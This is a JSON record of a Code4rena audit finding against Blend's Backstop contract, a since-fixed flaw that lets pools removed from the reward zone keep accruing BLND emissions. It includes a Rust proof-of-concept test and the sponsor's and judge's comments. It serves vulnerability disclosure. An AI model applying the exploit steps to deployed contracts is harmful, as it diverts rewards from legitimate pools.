@@ -1,0 +1,95 @@
+{
+    "id": 62069,
+    "kind": "GIT",
+    "auditfirm_id": 2,
+    "impact": "MEDIUM",
+    "finders_count": 11,
+    "protocol_id": 2159,
+    "title": "[M-06] Pools outside of the reward zone can keep receiving Blend tokens",
+    "content": "\n\n<https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/emissions/manager.rs# L228>\n\n### Finding description and impact\n\nThe Blend Protocol utilizes the `Backstop` contract as a curator system for lending pools created in the factory. The concept is that depositors in the `Backstop` contract act as a first line of capital loss if a pool accrues bad debt during its operation. These backstop depositors are incentivized through a portion of the interest charged to borrowers for each specific pool. Additionally, the system emits Blend tokens to pools that are within the reward zone.\n\nA critical invariant in the `Backstop` system is that Blend tokens should only be emitted to pools within the reward zone. However, this report highlights a flaw that allows a pool to continue receiving Blend emissions even after it has been removed from the reward zone, thereby completely undermining the `Backstop` system.\n\nTo understand this issue, we first examine the code responsible for removing a pool, specifically the `remove_pool()` function. Within this function, the [following line](https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/emissions/manager.rs# L95) is crucial:\n```\n\n// ....\nset_rz_emissions(e, &to_remove, i128::MAX,to_remove_emis_data.accrued, false);\n// ....\n```\n\nThis line sets the reward zone index of the removed pool to `i128::MAX`, which is intended to prevent the pool from accumulating further emissions.\n\nNext, we consider the `update_rz_emis_data()` [function](https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/emissions/manager.rs# L228), where the root cause of the issue lies:\n```\n\n// ....\nif  emission_data.index <  gulp_index  ||  to_gulp {\n\tif  pool_balance.non_queued_tokens() > 0 {\n\t\tlet  new_emissions  =  pool_balance.non_queued_tokens().fixed_mul_floor(gulp_index - emission_data.index, SCALAR_14).unwrap_optimized();\n\t\taccrued  +=  new_emissions;\n\t\treturn  set_rz_emissions(e, pool, gulp_index, accrued, to_gulp);\n} else {\n\treturn  set_rz_emissions(e, pool, gulp_index, accrued, to_gulp);\n}\n\n// ....\n}\n```\n\nIn the `if` clause, the function updates the reward zone emissions information for a pool if either of the following conditions is met:\n\n1. `emission_data.index < gulp_index`: This condition will be false since the `emission_data.index` of the pool was set to `i128::MAX` during `remove_pool()`.\n2. `to_gulp == true`: This condition will be true if the current function is invoked via the `gulp_emissions()` [function](https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/emissions/manager.rs# L198).\n\nIf the pool has `non_queued_tones() == 0`, then at the end of the `update_rz_emis_data` function, the code resets the index value for the pool, effectively allowing it to continue accruing Blend rewards even though it is no longer in the reward zone.\n\nThis issue is significant as it breaks the intended functionality of the `Backstop` system, allowing pools outside the reward zone to receive emissions; which will lead to the completely malfunction of the Blend protocol as there will be more Blend emitted to pools than actually Blend sent by the emitter contract as well as breaking the curation system.\n\n### Proof of Concept\n\nAs this issue is hard to follow, I would like to present a coded proof of concept that shows its validity. Follow the next instructions to run the coded PoC:\n\nFirst, we need a couple of helper functions in the main contract (these are just getter functions).\n\n1. Add the following to the `backstop/src/contract.rs` file:\n\nTo the `trait Backstop`:\n```\n\n////////////////////////// ADDED FOR THE PoC ///////////////////////////\n\nfn  get_user_balance(e:  Env, pool:  Address, user:  Address) ->  UserBalance;\nfn  get_pool_balance(e:  Env, pool:  Address) ->  PoolBalance;\nfn  get_rz_emission_data(e:  Env, pool:  Address) -> storage::RzEmissionData;\nfn  get_rz_emission_index(e:  Env) ->  i128;\nfn  get_backstop_emission_data(e:  Env, pool:  Address) -> storage::BackstopEmissionData;\nfn  get_user_emission_data(e:  Env, pool:  Address, user:  Address) -> storage::UserEmissionData;\nfn  get_reward_zone(e:  Env) ->  Vec<Address>;\nfn  get_last_distribution_time(e:  Env) ->  u64;\n```\n\nTo the `impl BackstopContract`:\n```\n\n////////////////////////// ADDED FOR THE PoC ///////////////////////////\n\nfn  get_user_balance(e:  Env, pool:  Address, user:  Address) ->  UserBalance {\n\tstorage::get_user_balance(&e, &pool, &user)\n}\n\nfn  get_pool_balance(e:  Env, pool:  Address) ->  PoolBalance {\n\tstorage::get_pool_balance(&e, &pool)\n}\n\nfn  get_rz_emission_index(e:  Env) ->  i128 {\n\tstorage::get_rz_emission_index(&e)\n}\n\nfn  get_rz_emission_data(e:  Env, pool:  Address) -> storage::RzEmissionData {\n\tstorage::get_rz_emis_data(&e, &pool).unwrap()\n}\n\nfn  get_backstop_emission_data(e:  Env, pool:  Address) -> storage::BackstopEmissionData {\n\tstorage::get_backstop_emis_data(&e, &pool).unwrap()\n}\n\nfn  get_user_emission_data(e:  Env, pool:  Address, user:  Address) -> storage::UserEmissionData {\n\tstorage::get_user_emis_data(&e, &pool, &user).unwrap()\n}\n\nfn  get_reward_zone(e:  Env) ->  Vec<Address> {\n\tstorage::get_reward_zone(&e)\n}\n\nfn  get_last_distribution_time(e:  Env) ->  u64 {\n\tstorage::get_last_distribution_time(&e)\n}\n```\n\n2. Create a file `test_blend_c4_audit.rs` into the `test-suites/tests/` folder and paste the following:\n```\n\n#![cfg(test)]\nuse soroban_sdk::{testutils::Address  as _, vec, Address, String};\n\nuse test_suites::{\ncreate_fixture_with_data,\ntest_fixture::{TokenIndex, SCALAR_7},\n};\n\n#[test]\nfn  test_backstop_emissions_without_being_in_reward_zone() {\nlet  mut  fixture  =  create_fixture_with_data(true);\nlet  bstop_token  =  &fixture.lp;\nlet  frodo  =  fixture.users[0].clone();\n\n// Lets create a second pool which can be created by the attacker.\nfixture.create_pool(\n\tString::from_str(&fixture.env, \"MaliciousPool\"),\n\t0_1000000,\n\t6,\n\t1_0000000,\n);\n\nlet  legit_pool  =  &fixture.pools[0];\nlet  malicious_pool  =  &fixture.pools[1];\n\n// Frodo makes a deposit into the malicious pool.\nfixture.backstop.deposit(&frodo, &malicious_pool.pool.address, &(50_000  *  SCALAR_7));\n\n// We add the malicious pool to the reward zone.\nfixture.backstop.add_reward(&malicious_pool.pool.address, &None);\n\n// We get the reward zone and assert that it contains the two pools.\nlet  get_the_reward_zone  =  fixture.backstop.get_reward_zone();\nassert_eq!(get_the_reward_zone.len(), 2);\nassert!(get_the_reward_zone.contains(&legit_pool.pool.address));\nassert!(get_the_reward_zone.contains(&malicious_pool.pool.address));\n\n// Some time passes and some blend is emitted.\nfixture.jump(2  *  24  *  60  *  60);\nfixture.emitter.distribute();\nfixture.backstop.distribute();\n\n// At this point we can observe that the global index has increased and thefore the malicious pool has accrued some emissions.\nlet  rz_emission_index  =  fixture.backstop.get_rz_emission_index();\nlet  rz_pool_emission_data_malicious_pool  =\nfixture.backstop.get_rz_emission_data(&malicious_pool.pool.address);\n\nprintln!(\"RZ Emission Index: {:?}\", rz_emission_index);\nprintln!(\"RZ Emission Data Malicious Pool: {:?}\", rz_pool_emission_data_malicious_pool.index);\nprintln!(\"RZ Emission Data Malicious Pool Accrued: {:?}\", rz_pool_emission_data_malicious_pool.accrued);\nprintln!();\n\n// Now frodo requests a queue withdrawal.\nfixture.backstop.queue_withdrawal(&frodo, &malicious_pool.pool.address, &(50_000  *  SCALAR_7));\n\n// Now we can observe that the index of the malicious pool is updated to be equal to the global index and some emissions have been accrued.\nlet  rz_emission_index  =  fixture.backstop.get_rz_emission_index();\nlet  rz_pool_emission_data_malicious_pool  = fixture.backstop.get_rz_emission_data(&malicious_pool.pool.address);\n\nprintln!(\"RZ Emission Index: {:?}\", rz_emission_index);\nprintln!(\"RZ Emission Data Malicious Pool: {:?}\", rz_pool_emission_data_malicious_pool.index);\nprintln!(\"RZ Emission Data Malicious Pool Accrued: {:?}\", rz_pool_emission_data_malicious_pool.accrued);\nprintln!();\n\n// The withdrawal is processed and the malicious pool is removed from the reward zone.\nfixture.jump(17  *  24  *  60  *  60);\nfixture.emitter.distribute();\nfixture.backstop.distribute();\nfixture.backstop.withdraw(&frodo, &malicious_pool.pool.address, &(50_000  *  SCALAR_7));\nfixture.backstop.remove_reward(&malicious_pool.pool.address);\n\n// We get the reward zone and assert that the malicious pool is no longer in it.\nlet  get_the_reward_zone  =  fixture.backstop.get_reward_zone();\nassert_eq!(get_the_reward_zone.len(), 1);\nassert!(!get_the_reward_zone.contains(&malicious_pool.pool.address));\n\n// Now we can observe that the index of the malicious pool has been updated to the maximum possible value.\n// due to the removal. The accrued emissions still remain.\nlet  rz_pool_emission_data_malicious_pool  = fixture.backstop.get_rz_emission_data(&malicious_pool.pool.address);\n\nprintln!(\"RZ Emission Data Malicious Pool: {:?}\", rz_pool_emission_data_malicious_pool.index);\nprintln!(\"RZ Emission Data Malicious Pool Accrued: {:?}\", rz_pool_emission_data_malicious_pool.accrued);\nprintln!();\n\n// Gulp the emissions to accrue the pending emissions.\nmalicious_pool.pool.gulp_emissions();\n\n// Due to the vulnerability described, we can observe that gulp emissions reseted the index of the malicious pool.\nlet  rz_emission_index  = fixture.backstop.get_rz_emission_index();\nlet  rz_pool_emission_data_malicious_pool  = fixture.backstop.get_rz_emission_data(&malicious_pool.pool.address);\n\nprintln!(\"RZ Emission Index: {:?}\", rz_emission_index);\nprintln!(\"RZ Emission Data Malicious Pool: {:?}\", rz_pool_emission_data_malicious_pool.index);\nprintln!(\"RZ Emission Data Malicious Pool Accrued: {:?}\", rz_pool_emission_data_malicious_pool.accrued);\nprintln!();\n\n// Now we can deposit again into the malicious pool which can continue to accrue emissions even if it is not in the reward zone.\nfixture.backstop.deposit(&frodo, &malicious_pool.pool.address, &(50_000  *  SCALAR_7));\n\nfixture.jump(2  *  24  *  60  *  60);\nfixture.emitter.distribute();\nfixture.backstop.distribute();\nfixture.backstop.deposit(&frodo, &malicious_pool.pool.address, &(1  *  SCALAR_7));\n\nlet rz_emission_index = fixture.backstop.get_rz_emission_index();\nlet rz_pool_emission_data_malicious_pool = fixture.backstop.get_rz_emission_data(&malicious_pool.pool.address;\n\nprintln!(\"RZ Emission Index: {:?}\", rz_emission_index);\nprintln!(\"RZ Emission Data Malicious Pool: {:?}\", rz_pool_emission_data_malicious_pool.index);\nprintln!(\"RZ Emission Data Malicious Pool Accrued: {:?}\", rz_pool_emission_data_malicious_pool.accrued);\nprintln!();\n\n// The pool can even gulp emissions again!.\nmalicious_pool.pool.gulp_emissions();\n\nlet  rz_emission_index  =  fixture.backstop.get_rz_emission_index();\nlet  rz_pool_emission_data_malicious_pool  =\nfixture.backstop.get_rz_emission_data(&malicious_pool.pool.address);\n\nprintln!(\"RZ Emission Index: {:?}\", rz_emission_index);\nprintln!(\"RZ Emission Data Malicious Pool: {:?}\", rz_pool_emission_data_malicious_pool.index);\nprintln!(\"RZ Emission Data Malicious Pool Accrued: {:?}\", rz_pool_emission_data_malicious_pool.accrued);\nprintln!();\n}\n```\n\n3. Run `make clean` and then `make build`.\n4. Run `cargo test --test test_blend_c4_audit -- --nocapture -- test_backstop_emissions_without_being_in_reward_zone`.\n\n### Recommended mitigation steps\n\nTo address this issue is important to consider in the `update_rz_emis_data` function to not update the index of pools that no longer are in the reward zone.\n\n**markus\\_pl10 (Script3) confirmed**\n\n**[mootz12 (Script3) commented](https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-14?commentParent=5qyiFuhXNt8):**\n\n> Validated this is an issue.\n>\n> Note that this only affects emissions distributed by the protocol. It could cause emissions to become “unclaimable” for users, as the malicious pools would effectively capture some of the BLND going to the legit pools.\n>\n> No user deposited funds are at risk.\n\n**[LSDan (judge) commented](https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-14?commentParent=5qyiFuhXNt8&commentChild=Sb8Lzc6KTeA):**\n\n> I have a hard time seeing this as more than a medium. I would need to see maximum economic impact to bring it to high per [the docs](https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023# verdict-loss-of-yield-as-high). None of the reports highlight a large impact.\n\n**[mootz12 (Script3) commented](https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-14?commentParent=qcnjeBdNjak):**\n\n> Fixed to revert `rz_index` change to how it worked in v1 (plus some optimizations to support more reward zone pools), removing this issue.\n\n**[Blend mitigated](https://github.com/code-423n4/2025-04-blend-mitigation?tab=readme-ov-file# mitigation-of-high--medium-severity-issues):**\n\n> [Commit 77373e3](https://github.com/blend-capital/blend-contracts-v2/commit/77373e35f8fd91408df9a3f79d1e4443c13e8f4a) to remove `rz index` from backstop emissions.\n\n**Status:** Mitigation confirmed. Full details in reports from [0xAlix2](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-14), [0x007](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-47), [Testerbot](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-66) and [oakcobalt](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-38).\n\n---\n\n",
+    "summary": "\nThis bug report highlights a flaw in the Blend Protocol's `Backstop` contract, which is responsible for managing lending pools. The issue allows a pool to continue receiving Blend tokens even after it has been removed from the reward zone, which undermines the system. The root cause of the issue lies in a function that updates the reward zone emissions information for a pool, and it can be exploited through the `gulp_emissions()` function. A proof of concept has been provided to demonstrate the validity of the issue. To mitigate this issue, the `update_rz_emis_data` function should be modified to prevent pools that are no longer in the reward zone from receiving emissions. The severity of this issue is considered medium, as it only affects emissions distributed by the protocol and does not put user deposited funds at risk. The Blend team has confirmed the issue and has released a fix in a recent commit. The status of this issue is now considered mitigated. ",
+    "report_date": "2025-08-13T00:00:00.000Z",
+    "contest_prize_txt": "125000",
+    "contest_link": "https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification",
+    "sponsor_name": "Blend",
+    "sponsor_link": "",
+    "quality_score": 0,
+    "general_score": 0,
+    "source_link": "https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification",
+    "github_link": "https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-14",
+    "pdf_link": "",
+    "pdf_page_from": 0,
+    "contest_id": "492",
+    "slug": "m-06-pools-outside-of-the-reward-zone-can-keep-receiving-blend-tokens-code4rena-blend-blend-git",
+    "firm_name": "Code4rena",
+    "firm_logo_square": "code4rena_square.png",
+    "protocol_name": "Blend",
+    "bookmarked": false,
+    "read": false,
+    "issues_issue_finders": [
+        {
+            "wardens_warden": {
+                "handle": "carrotsmuggler"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "rapid"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "jasonxiale"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "0xabhay"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "adamIdarrha"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Testerbot"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "rscodes"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "aldarion"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "0xAlix2"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Tigerfrake"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Kirkeelee"
+            }
+        }
+    ],
+    "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+    },
+    "protocols_protocol": {
+        "name": "Blend",
+        "protocols_protocolcategoryscore": []
+    },
+    "issues_issuetagscore": []
+}
